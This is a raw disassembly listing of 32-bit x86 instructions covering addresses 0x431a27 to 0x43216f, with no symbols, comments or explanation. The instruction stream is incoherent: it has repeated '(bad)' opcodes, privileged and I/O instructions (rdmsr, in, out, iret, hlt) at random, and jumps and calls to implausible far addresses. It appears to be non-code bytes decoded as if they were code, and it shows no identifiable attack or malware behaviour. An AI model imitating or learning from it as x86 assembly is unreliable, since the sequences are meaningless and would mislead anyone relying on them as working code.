  431a27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a2d:	rdmsr  
  431a2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a36:	dec    ebp
  431a37:	ret    
  431a38:	mov    edi,DWORD PTR [esi-0x4]
  431a3b:	pop    eax
  431a3c:	dec    ebp
  431a3d:	jne    0x4319ca
  431a3f:	xor    edi,esp
  431a41:	inc    eax
  431a42:	dec    ebp
  431a43:	jbe    0x431a98
  431a45:	inc    eax
  431a46:	pop    ebp
  431a47:	add    edx,DWORD PTR [esi+0x8]
  431a4a:	push   esp
  431a4b:	dec    eax
  431a4c:	push   ecx
  431a4d:	mov    eax,edi
  431a4f:	and    al,0xf0
  431a51:	jo     0x431a3e
  431a53:	mov    eax,DWORD PTR [ebx]
  431a55:	sbb    BYTE PTR [ebp+0x4d],cl
  431a58:	mov    eax,DWORD PTR [ebx]
  431a5a:	nop
  431a5b:	or     BYTE PTR [eax],al
  431a5d:	jne    0x431ab6
  431a5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a65:	cld    
  431a66:	xor    edi,edi
  431a68:	add    edi,DWORD PTR [ebp+0x3]
  431a6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a71:	js     0x4319f7
  431a73:	jae    0x431a77
  431a75:	(bad)  
  431a77:	xor    al,0x5d
  431a79:	jmp    0x431a06
  431a7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a82:	fdecstp 
  431a84:	test   BYTE PTR [edi],ah
  431a86:	add    bh,BYTE PTR [ebp+0x0]
  431a89:	add    ebx,DWORD PTR [ebp-0x77]
  431a8c:	mov    edi,eax
  431a8e:	cmp    al,0x0
  431a91:	adc    dh,BYTE PTR [ebx]
  431a93:	jge    0x431a98
  431a95:	mov    edi,DWORD PTR [ebx]
  431a97:	jl     0x431aa8
  431a99:	clc    
  431a9a:	dec    edi
  431a9b:	jge    0x431a9d
  431a9d:	mov    eax,DWORD PTR [ebx]
  431a9f:	jb     0x431aa9
  431aa1:	mov    ecx,DWORD PTR [ebp-0x8]
  431aa4:	mov    edi,edi
  431aa6:	xor    edx,DWORD PTR [eax]
  431aa8:	add    edi,DWORD PTR [ebx]
  431aaa:	mov    DWORD PTR [ebp-0x10],edi
  431aad:	inc    edi
  431aae:	pop    ebp
  431aaf:	jge    0x431aec
  431ab1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ab5:	mov    edx,0xc05d87f0
  431aba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431abe:	fimul  WORD PTR [eax]
  431ac0:	fist   WORD PTR [ebp+0x1c]
  431ac3:	in     al,dx
  431ac4:	jne    0x431ab2
  431ac6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431acc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431ad0:	fdivp  st(0),st
  431ad2:	fild   WORD PTR [ebp+0x4510f85c]
  431ad8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431ade:	inc    ebp
  431adf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ae5:	mov    ebp,DWORD PTR [ebx-0x4]
  431ae8:	adc    al,0x8b
  431aea:	rcl    DWORD PTR [eax],0x48
  431aed:	mov    esi,0x7080803
  431af2:	fiadd  WORD PTR [ebp+0x4d]
  431af5:	(bad)  
  431af6:	mov    edx,DWORD PTR [edx-0x4]
  431af9:	mov    edx,DWORD PTR [ebp-0x4]
  431afc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b02:	mov    DWORD PTR [edi+0x872dc],edi
  431b08:	xlat   BYTE PTR ds:[ebx]
  431b09:	into   
  431b0a:	ffreep st(6)
  431b0c:	retf   0x6c7
  431b0f:	iret   
  431b10:	dec    ebp
  431b11:	inc    ebp
  431b12:	mov    DWORD PTR [ebx],edi
  431b14:	fmul   QWORD PTR [edi]
  431b16:	dec    ebp
  431b17:	jnp    0x431b4c
  431b19:	add    BYTE PTR [ebx],al
  431b1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431b1e:	inc    ebp
  431b1f:	dec    ebp
  431b20:	lea    esi,[ebx]
  431b22:	add    DWORD PTR [ebx],eax
  431b24:	jb     0x431b61
  431b26:	add    BYTE PTR [edi],cl
  431b28:	inc    ebp
  431b29:	imul   eax,edi,0x858bd800
  431b2f:	cld    
  431b30:	clc    
  431b31:	mov    DWORD PTR [ebp+0x0],eax
  431b34:	inc    DWORD PTR [eax]
  431b36:	or     al,0xde
  431b38:	sbb    bh,0x1
  431b3b:	retf   
  431b3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b43:	dec    ebp
  431b44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b4a:	enter  0x12de,0xdf
  431b4e:	inc    ebp
  431b4f:	pop    ebp
  431b50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b56:	add    DWORD PTR [edx],edx
  431b58:	add    BYTE PTR [ebp+0x50],dl
  431b5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b67:	or     ah,al
  431b69:	pop    ss
  431b6a:	cdq    
  431b6b:	push   ebp
  431b6c:	clc    
  431b6d:	mov    eax,DWORD PTR [ebp-0x4]
  431b70:	xor    edx,edx
  431b72:	add    esi,DWORD PTR [ebx]
  431b74:	cmp    eax,DWORD PTR [ebx]
  431b76:	hlt    
  431b77:	cmp    DWORD PTR [ebx],esp
  431b79:	or     al,BYTE PTR [ebp+0xf]
  431b7c:	mov    eax,DWORD PTR [edx]
  431b7e:	loopne 0x431b80
  431b80:	(bad)  
  431b81:	mov    ecx,esi
  431b83:	cld    
  431b84:	pushf  
  431b85:	pop    ebp
  431b86:	fwait
  431b87:	mov    esi,DWORD PTR [edx]
  431b89:	lock mov eax,eax
  431b8c:	adc    BYTE PTR [ebx],al
  431b8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b9b:	dec    ebp
  431b9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ba2:	(bad)  
  431ba3:	iret   
  431ba4:	inc    ebp
  431ba5:	(bad)  
  431ba6:	jne    0x431bf5
  431ba8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431bae:	(bad)  
  431baf:	cmp    ebx,eax
  431bb1:	je     0x431b39
  431bb3:	add    edi,edi
  431bb5:	or     bh,bh
  431bb7:	dec    ebp
  431bb8:	inc    ebp
  431bb9:	mov    esi,DWORD PTR [ebx]
  431bbb:	cld    
  431bbc:	add    ecx,esi
  431bbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431bc1:	mov    edx,DWORD PTR [edi]
  431bc3:	or     BYTE PTR [ebp-0x7c],al
  431bc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bcc:	test   BYTE PTR [ebx+ebx*4],cl
  431bcf:	inc    ebp
  431bd0:	xor    bh,BYTE PTR [esi]
  431bd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bd9:	jne    0x431ba2
  431bdb:	mov    ebp,esp
  431bdd:	fcomp  DWORD PTR [ebx]
  431bdf:	add    BYTE PTR [ecx],al
  431be1:	inc    DWORD PTR [ebp-0x75]
  431be4:	(bad)  
  431be5:	cld    
  431be6:	add    al,0xce
  431be8:	mov    ecx,edi
  431bea:	cld    
  431beb:	inc    ebp
  431bec:	fidivr WORD PTR [ebx]
  431bee:	fbstp  TBYTE PTR [ebp-0x3e]
  431bf1:	mov    eax,DWORD PTR [eax]
  431bf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431bf9:	fadd   st,st(7)
  431bfb:	add    BYTE PTR [ebp-0x1],al
  431bfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431c01:	inc    ebp
  431c02:	mov    bh,0xc7
  431c05:	loopne 0x431c4c
  431c07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c0d:	sbb    dh,BYTE PTR [ebx]
  431c0f:	pushf  
  431c10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c16:	mov    eax,edi
  431c18:	cwde   
  431c19:	inc    ebp
  431c1a:	inc    ebp
  431c1b:	jne    0x431ba8
  431c1d:	mov    esp,esp
  431c1f:	clc    
  431c20:	add    al,0x4d
  431c22:	mov    DWORD PTR [ebx],esi
  431c24:	or     al,0x33
  431c26:	inc    ebp
  431c27:	lea    ecx,[ebx-0x398d13fd]
  431c2d:	add    bh,al
  431c2f:	inc    ebp
  431c30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c37:	add    ebp,esp
  431c39:	shufps xmm1,xmm3,0xc7
  431c3d:	(bad)  
  431c3e:	jmp    0x74885767
  431c43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c49:	hlt    
  431c4a:	mov    ecx,DWORD PTR [edi]
  431c4c:	fadd   DWORD PTR [ebp+0x0]
  431c4f:	xor    ecx,DWORD PTR [edi]
  431c51:	add    ecx,ecx
  431c53:	cmp    edi,edi
  431c55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c59:	(bad)  
  431c5a:	jmp    0x431be7
  431c5c:	mov    edi,esp
  431c5e:	or     al,0xc6
  431c60:	inc    ebp
  431c61:	(bad)  
  431c62:	mov    eax,DWORD PTR [ebp+0x10]
  431c65:	jne    0x431bf0
  431c67:	mov    eax,DWORD PTR [ecx]
  431c69:	clc    
  431c6a:	add    BYTE PTR [ebp-0x40],cl
  431c6d:	xor    edx,DWORD PTR [eax-0x73]
  431c70:	jne    0x431c73
  431c72:	push   DWORD PTR [edx+0x8]
  431c75:	add    BYTE PTR [ebp+0x45],al
  431c78:	mov    ebp,ecx
  431c7a:	cld    
  431c7b:	add    BYTE PTR [ebp+0x0],cl
  431c7e:	xor    eax,DWORD PTR [ebp+0x3]
  431c81:	mov    DWORD PTR [ebx],edi
  431c83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c89:	sub    eax,0x5d330e4d
  431c8e:	lea    esi,[ebx]
  431c90:	add    DWORD PTR [ebx],eax
  431c92:	jb     0x431c7d
  431c94:	add    BYTE PTR [eax],al
  431c96:	inc    ebp
  431c97:	add    bl,ch
  431c99:	inc    ebp
  431c9a:	mov    esi,DWORD PTR [ebx]
  431c9c:	or     al,0x3
  431c9e:	(bad)  
  431c9f:	mov    edi,eax
  431ca1:	in     al,dx
  431ca2:	scas   eax,DWORD PTR es:[edi]
  431ca3:	inc    ebp
  431ca4:	mov    esi,DWORD PTR [ebx]
  431ca6:	in     al,0x3
  431ca8:	add    al,0x89
  431caa:	mov    ecx,DWORD PTR [eax+edi*8]
  431cad:	dec    ebp
  431cae:	(bad)  
  431caf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431cb6:	mov    ecx,eax
  431cb8:	cld    
  431cb9:	push   es
  431cba:	dec    ebp
  431cbb:	add    al,0x33
  431cbd:	mov    DWORD PTR [ebx],eax
  431cbf:	in     al,dx
  431cc0:	cmp    DWORD PTR [ebp-0x67],eax
  431cc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cc9:	mov    edx,DWORD PTR [ebp-0x4]
  431ccc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431ccf:	xor    eax,DWORD PTR [ebp+0x3]
  431cd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431cd8:	xor    edi,esp
  431cda:	jmp    0xff771a2c
  431cdf:	add    ecx,DWORD PTR [ebp-0x3f]
  431ce2:	xor    ebx,DWORD PTR [edi]
  431ce4:	add    eax,ecx
  431ce6:	cmp    ebx,DWORD PTR [eax]
  431ce8:	mov    ecx,DWORD PTR [ebp-0x4]
  431ceb:	mov    ecx,DWORD PTR [eax]
  431ced:	adc    BYTE PTR [ebp-0x80],al
  431cf0:	jmp    0x431cf3
  431cf2:	mov    eax,DWORD PTR [eax]
  431cf4:	cld    
  431cf5:	mov    bh,0xc6
  431cf7:	push   ecx
  431cf8:	(bad)  
  431cf9:	jne    0x431d59
  431cfb:	dec    ecx
  431cfd:	or     BYTE PTR [ecx+ebx*1],cl
  431d00:	push   ebp
  431d01:	inc    ebp
  431d02:	in     al,dx
  431d03:	add    ebp,esp
  431d05:	or     bh,al
  431d07:	dec    ebp
  431d08:	cld    
  431d09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d0f:	xor    DWORD PTR [edx],0x2
  431d12:	pushf  
  431d13:	dec    DWORD PTR [ebx+0x45510cf4]
  431d19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d1f:	mov    edx,DWORD PTR [ecx+0xc]
  431d22:	xor    eax,esi
  431d24:	mov    edx,0xc172c7
  431d29:	inc    ebp
  431d2a:	mov    esi,DWORD PTR [ebp+0x8]
  431d2d:	mov    eax,edx
  431d2f:	call   0x84c7e424
  431d34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d3a:	mov    ebp,eax
  431d3c:	or     BYTE PTR [eax],dl
  431d3e:	jo     0x431d8d
  431d40:	push   edi
  431d41:	xor    esi,DWORD PTR [ebp+0x3]
  431d44:	(bad)  
  431d45:	pmulhuw mm0,mm1
  431d48:	test   DWORD PTR [ebp-0x8],ecx
  431d4b:	mov    DWORD PTR [ebp-0x67],eax
  431d4e:	mov    eax,DWORD PTR [ebp-0x4]
  431d51:	xor    edi,DWORD PTR [ebp-0x73]
  431d54:	xor    eax,DWORD PTR [ebx]
  431d56:	xor    esi,DWORD PTR [edx+0x3]
  431d59:	add    BYTE PTR [ecx],bh
  431d5b:	inc    ebp
  431d5c:	(bad)  
  431d5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d63:	mov    DWORD PTR [eax],0x750f0004
  431d69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d6f:	lock add BYTE PTR [ebp+0x0],cl
  431d73:	mov    esi,DWORD PTR [ebp-0x18]
  431d76:	mov    ebp,edx
  431d78:	or     al,0x72
  431d7a:	ja     0x431d7c
  431d7c:	mov    edx,esi
  431d7e:	cld    
  431d7f:	(bad)  
  431d82:	cli    
  431d83:	mov    esi,DWORD PTR [ebp-0x4]
  431d86:	cmp    ecx,esi
  431d88:	bswap  edi
  431d8a:	(bad)
  431d8e:	mov    esi,DWORD PTR [ebp-0x4]
  431d91:	mov    esi,ecx
  431d93:	clc    
  431d94:	repnz add esi,DWORD PTR [ebp+0x45]
  431d98:	push   ebx
  431d99:	xor    eax,DWORD PTR [ebp+0x3]
  431d9c:	cmp    al,0x5f
  431d9e:	pushf  
  431d9f:	pop    ebx
  431da0:	jmp    0x431e67
  431da5:	mov    esi,DWORD PTR [ebp-0x7d]
  431da8:	xor    ebp,DWORD PTR [eax]
  431daa:	lea    eax,[ebp-0x8]
  431dad:	xor    edx,esi
  431daf:	pushf  
  431db0:	out    dx,eax
  431db1:	(bad)  
  431db2:	neg    eax
  431db4:	ins    DWORD PTR es:[edi],dx
  431db5:	test   esi,edi
  431db7:	clc    
  431db8:	pop    esp
  431db9:	inc    ebp
  431dba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dc0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431dc6:	add    cl,al
  431dc8:	jne    0x431d65
  431dca:	mov    esi,DWORD PTR [edx]
  431dcc:	in     al,dx
  431dcd:	push   esi
  431dce:	xor    BYTE PTR [ebp-0xe],dh
  431dd1:	add    edi,esi
  431dd3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dd9:	add    cl,bh
  431ddb:	mov    edi,DWORD PTR [ebp+0x8]
  431dde:	mov    DWORD PTR [ebp-0x14],esi
  431de1:	add    esi,DWORD PTR [ebp+0x3c]
  431de4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dea:	mov    ah,0x3e
  431dec:	fwait
  431ded:	pushf  
  431dee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431df4:	jne    0x431d81
  431df6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431df9:	icebp  
  431dfa:	icebp  
  431dfb:	shl    edx,0xf2
  431dfe:	(bad)  
  431dff:	mov    ah,0x16
  431e01:	push   eax
  431e02:	jne    0x431d97
  431e04:	mov    ecx,DWORD PTR [edi]
  431e06:	in     al,dx
  431e07:	jmp    0x431dfa
  431e09:	add    dl,dh
  431e0b:	mov    edi,esi
  431e0d:	or     al,0x8
  431e0f:	inc    ebp
  431e10:	jne    0x431e15
  431e12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e18:	ret    
  431e19:	or     bh,bh
  431e1b:	jge    0x431e05
  431e1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e23:	xor    edi,eax
  431e25:	add    esi,DWORD PTR [ebp-0x77]
  431e28:	mov    ebx,esp
  431e2a:	clc    
  431e2b:	neg    DWORD PTR [ebp-0x7c]
  431e2e:	xor    eax,DWORD PTR [eax]
  431e30:	cmp    eax,DWORD PTR [eax]
  431e32:	repz jne 0x431dca
  431e35:	xor    eax,DWORD PTR [ecx]
  431e37:	add    ebx,DWORD PTR [eax]
  431e39:	mov    DWORD PTR [ebp-0x8],eax
  431e3c:	mov    eax,edi
  431e3e:	cld    
  431e3f:	lock pop eax
  431e41:	test   DWORD PTR [ebx],esi
  431e43:	clc    
  431e44:	add    edx,DWORD PTR [edi-0x740bff77]
  431e4a:	fdivp  st(4),st
  431e4c:	test   ecx,esi
  431e4e:	(bad)  
  431e4f:	jnp    0x431e50
  431e51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e57:	jae    0x431de4
  431e59:	sub    edi,esp
  431e5b:	(bad)  
  431e5c:	shl    DWORD PTR [eax-0x3e],0x89
  431e60:	leave  
  431e61:	call   0x8198d56e
  431e66:	in     al,dx
  431e67:	(bad)  
  431e68:	in     al,dx
  431e69:	add    bh,al
  431e6b:	mov    esp,edi
  431e6d:	in     al,dx
  431e6e:	test   DWORD PTR [ebp-0x8],edi
  431e71:	mov    eax,DWORD PTR [ebp+0x2b]
  431e74:	xor    al,BYTE PTR [ebx]
  431e76:	pushf  
  431e77:	jnp    0x57321ab0
  431e7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e81:	loopne 0x431eb6
  431e83:	jne    0x431e40
  431e85:	mov    esi,DWORD PTR [edx-0x20]
  431e88:	add    BYTE PTR [ebp-0x3d],bh
  431e8b:	xor    eax,DWORD PTR [ebp-0x73]
  431e8e:	mov    edi,DWORD PTR [esi]
  431e90:	cld    
  431e91:	jb     0x431e59
  431e93:	add    bl,al
  431e95:	jne    0x431edc
  431e97:	mov    edx,DWORD PTR [edi-0x10]
  431e9a:	jge    0x431f19
  431e9c:	mov    esi,DWORD PTR [ebx]
  431e9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431ea2:	xor    esi,DWORD PTR [ebp-0x77]
  431ea5:	mov    esi,eax
  431ea7:	lock inc ebp
  431ea9:	jge    0x431edc
  431eab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431eb2:	dec    ebp
  431eb3:	mov    esi,DWORD PTR [ebx]
  431eb5:	loopne 0x431e40
  431eb7:	jge    0x431eb1
  431eb9:	add    DWORD PTR [ebp-0x7d],eax
  431ebc:	icebp  
  431ebd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431ec4:	dec    ebp
  431ec5:	hlt    
  431ec6:	xor    ebx,DWORD PTR [ebp-0x77]
  431ec9:	mov    esi,esp
  431ecb:	in     al,0x45
  431ecd:	jge    0x431f0c
  431ecf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ed6:	dec    ebp
  431ed7:	push   esp
  431ed8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431ede:	inc    ebp
  431edf:	hlt    
  431ee0:	xor    DWORD PTR [ebp-0x61],esi
  431ee3:	mov    edi,DWORD PTR [eax+0xf19504]
  431ee9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431eed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ef0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ef4:	fistp  WORD PTR [ebx+0x0]
  431ef7:	inc    ebp
  431ef8:	mov    ebx,DWORD PTR [edi+0xc]
  431efb:	add    eax,eax
  431efd:	inc    ebp
  431efe:	test   BYTE PTR [ebx],dh
  431f00:	add    eax,DWORD PTR [ebx]
  431f02:	add    BYTE PTR [esi+0x45],bl
  431f05:	ret    0x85
  431f08:	jnp    0x5443a2d7
  431f0e:	inc    bp
  431f10:	inc    ebp
  431f11:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f17:	fdiv   QWORD PTR [ebx]
  431f19:	test   DWORD PTR [ecx+0x453bf8],edi
  431f1f:	push   ebx
  431f20:	add    edi,DWORD PTR [esi+0x708088b]
  431f26:	cmp    esi,eax
  431f28:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f2f:	mov    esp,edi
  431f31:	call   0x33ce6483
  431f36:	or     BYTE PTR [ebx],al
  431f38:	inc    ecx
  431f39:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f3f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f45:	lock add cl,al
  431f48:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f4f:	mov    ch,0x45
  431f51:	clc    
  431f52:	xor    eax,DWORD PTR [ebp+0x3]
  431f55:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f5b:	inc    ebp
  431f5c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f62:	mov    edi,eax
  431f64:	mov    eax,DWORD PTR [ebp+0x3c]
  431f67:	mov    ecx,DWORD PTR [eax]
  431f69:	hlt    
  431f6a:	inc    ebp
  431f6b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f72:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f78:	push   ebp
  431f79:	mov    edi,DWORD PTR [ebx]
  431f7b:	in     al,dx
  431f7c:	jne    0x431f3f
  431f7e:	mov    eax,DWORD PTR [ebp-0x28]
  431f81:	add    DWORD PTR [eax],0xe8058dec
  431f87:	clc    
  431f88:	mov    esi,DWORD PTR [edi-0x8]
  431f8b:	add    dh,dl
  431f8d:	rol    WORD PTR [ebp-0x1],cl
  431f91:	mov    edx,DWORD PTR [eax+0x8]
  431f94:	jne    0x431f56
  431f96:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f9d:	inc    ebp
  431f9e:	push   esp
  431f9f:	test   DWORD PTR [ecx+0xf],ecx
  431fa2:	sub    edx,esp
  431fa4:	add    eax,DWORD PTR [eax]
  431fa6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431fac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431fb3:	mov    eax,DWORD PTR [ecx]
  431fb5:	and    BYTE PTR [eax],al
  431fb7:	cmp    al,0x10
  431fb9:	add    BYTE PTR [ebp+0x66],al
  431fbc:	inc    ecx
  431fbe:	push   esp
  431fbf:	add    dh,BYTE PTR [ebp+0x0]
  431fc2:	push   edx
  431fc3:	enterw 0xc1,0x4d
  431fc8:	mov    esp,DWORD PTR [esi+0x20]
  431fcb:	add    DWORD PTR [ecx-0x7b],eax
  431fce:	add    eax,DWORD PTR [ebx]
  431fd0:	str    WORD PTR [eax+0x45]
  431fd4:	lea    ecx,[ebx+0x45890801]
  431fda:	sbb    BYTE PTR [ebx],al
  431fdc:	dec    ebp
  431fdd:	cmp    al,0xf
  431fdf:	inc    ebp
  431fe0:	push   eax
  431fe1:	mov    esi,DWORD PTR [ebx]
  431fe3:	push   eax
  431fe4:	add    eax,eax
  431fe6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fed:	inc    ebp
  431fee:	add    BYTE PTR [ecx],dh
  431ff0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431ff7:	(bad)  
  431ff8:	mov    ebx,eax
  431ffa:	loopne 0x432041
  431ffc:	dec    ebp
  431ffd:	mov    ecx,DWORD PTR [edi]
  431fff:	cld    
  432000:	push   eax
  432001:	xchg   DWORD PTR [ebx],esi
  432003:	add    DWORD PTR [ebx],ebp
  432005:	add    BYTE PTR [ebx],ch
  432007:	or     BYTE PTR [ecx],bh
  432009:	dec    ecx
  43200a:	loopne 0x43200f
  43200c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432012:	push   ebp
  432013:	add    DWORD PTR [ebx+0x55100800],eax
  432019:	dec    ebp
  43201a:	jmp    0x431fa5
  43201c:	mov    esp,DWORD PTR [eax]
  43201e:	sbb    dl,dl
  432020:	inc    eax
  432021:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432027:	add    BYTE PTR [ebx+0x74528555],cl
  43202d:	push   ebp
  43202e:	div    DWORD PTR [ebx]
  432030:	and    eax,DWORD PTR [ebx]
  432032:	add    edx,DWORD PTR [edx-0x30]
  432035:	jno    0x431fc2
  432037:	inc    DWORD PTR [eax+eiz*1]
  43203a:	inc    ebp
  43203b:	push   eax
  43203c:	push   eax
  43203d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432043:	mov    edi,esp
  432045:	push   eax
  432046:	inc    ebp
  432047:	enter  0x458b,0x8
  43204b:	push   ecx
  43204c:	(bad)  
  43204d:	call   0x10d2a25
  432052:	pop    ss
  432053:	push   ebp
  432054:	mov    ecx,DWORD PTR [ebx+0x489408]
  43205a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432060:	push   ecx
  432061:	jo     0x43204b
  432063:	inc    DWORD PTR [edi]
  432065:	or     BYTE PTR [eax],al
  432067:	call   0xce27b1
  43206c:	fmul   QWORD PTR [ebp+0x55]
  43206f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432075:	mov    bh,0x8c
  432077:	adc    al,0x9b
  432079:	dec    esp
  43207a:	xor    bl,BYTE PTR [eax]
  43207c:	mov    ecx,DWORD PTR [ebp+0xc]
  43207f:	mov    eax,DWORD PTR [ebp-0x4]
  432082:	mov    esi,DWORD PTR [edi-0x3148f924]
  432088:	push   es
  432089:	retf   
  43208a:	mov    BYTE PTR [ebp-0x30],0x3b
  43208e:	inc    ebp
  43208f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432096:	retf   0x83fc
  432099:	into   
  43209a:	dec    ebp
  43209b:	retf   
  43209c:	mov    ecx,DWORD PTR [ebp-0x74]
  43209f:	mov    eax,DWORD PTR [eax]
  4320a1:	fdiv   QWORD PTR [ebx]
  4320a3:	mov    bh,0x3
  4320a5:	push   es
  4320a6:	mov    esi,ecx
  4320a8:	sbb    cl,dl
  4320aa:	dec    ebp
  4320ab:	sar    DWORD PTR [ebx],cl
  4320ad:	push   ebp
  4320ae:	jne    0x4320bf
  4320b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320b6:	lea    ebx,[eax]
  4320b8:	call   0xf4ccac7f
  4320bd:	sbb    dh,dl
  4320bf:	add    edx,ebx
  4320c1:	push   ebp
  4320c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320c8:	push   ecx
  4320c9:	mov    DWORD PTR [eax-0x30],edx
  4320cc:	test   DWORD PTR [edx],eax
  4320ce:	xadd   esp,esi
  4320d1:	pop    es
  4320d2:	add    cl,dl
  4320d4:	mov    eax,ecx
  4320d6:	or     al,0x45
  4320d8:	(bad)  
  4320d9:	push   eax
  4320da:	add    DWORD PTR [edx+0x0],eax
  4320dd:	add    ecx,DWORD PTR [ecx]
  4320df:	and    dh,cl
  4320e1:	call   0xc729b1
  4320e6:	add    DWORD PTR [ebp+0x0],edx
  4320e9:	mov    esp,DWORD PTR [ebp+0x18]
  4320ec:	add    BYTE PTR [eax+0x50],cl
  4320ef:	xor    eax,DWORD PTR [eax]
  4320f1:	add    esp,DWORD PTR [esi+0x3b]
  4320f4:	inc    ebp
  4320f5:	je     0x43207a
  4320f7:	push   ecx
  4320f8:	dec    BYTE PTR [ebp-0x77]
  4320fb:	add    eax,esi
  4320fd:	or     al,0x5e
  4320ff:	inc    eax
  432100:	add    BYTE PTR [ebx],al
  432102:	data16 and BYTE PTR [ebp+0x50],al
  432106:	sub    DWORD PTR [ecx],0xfffffff8
  432109:	add    BYTE PTR [ebp-0x75],ah
  43210c:	add    BYTE PTR [eax],bl
  43210e:	enter  0x894d,0x8b
  432112:	int3   
  432113:	loopne 0x4320d7
  432115:	rol    BYTE PTR [eax],0x33
  432118:	lea    cx,[ebp+0xa]
  43211c:	data16 jb 0x432164
  43211f:	add    BYTE PTR [ebx+0x44890855],cl
  432125:	sbb    ah,al
  432127:	inc    ebp
  432128:	cmp    al,0xf
  43212a:	add    BYTE PTR [edx+0x66],dl
  43212d:	xor    ecx,DWORD PTR [eax]
  43212f:	sub    eax,DWORD PTR [edx]
  432131:	mov    eax,DWORD PTR [eax]
  432133:	or     al,0x66
  432135:	ror    edx,cl
  432137:	dec    ebp
  432138:	inc    ebp
  432139:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43213f:	cld    
  432140:	or     BYTE PTR [edi+0x4501dd],dl
  432146:	ret    0xecce
  432149:	retf   
  43214a:	(bad)  
  43214b:	dec    ebp
  43214c:	mov    al,0x8b
  43214e:	loopne 0x432170
  432150:	cmp    ecx,DWORD PTR [edx]
  432152:	inc    ebp
  432153:	daa    
  432154:	loopne 0x4320dd
  432156:	in     al,dx
  432157:	add    edi,eax
  432159:	add    BYTE PTR [eax+0x3f52e155],bh
  43215f:	push   ebp
  432160:	inc    ebp
  432161:	xor    ebx,edx
  432163:	add    ebp,esp
  432165:	push   edx
  432166:	push   bp
  432168:	inc    ebp
  432169:	(bad)  
  43216a:	in     eax,dx
  43216b:	push   esp
  43216c:	(bad)  
  43216d:	inc    edx
  43216f:	sbb    al,0x33
